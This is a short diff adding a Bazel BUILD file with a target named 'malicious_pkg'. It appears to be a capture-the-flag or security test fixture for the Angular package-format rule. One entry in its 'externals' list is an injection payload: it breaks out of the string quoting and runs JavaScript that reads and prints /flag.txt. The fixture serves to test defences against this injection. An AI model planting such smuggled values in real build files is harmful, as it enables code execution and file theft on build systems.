@@ -1,0 +1,10 @@
+load("@rules_angular//src/ng_package:angular_package_format.bzl", "angular_package_format")
+
+angular_package_format(
+    name = "malicious_pkg",
+    package = "test-123",
+    deps = [],
+    externals = [
+        "foo', (()=>{const fs=require('fs'); console.log('FLAG_FOUND:' + fs.readFileSync('/flag.txt','utf8').trim());})(), 'bar"
+    ]
+)
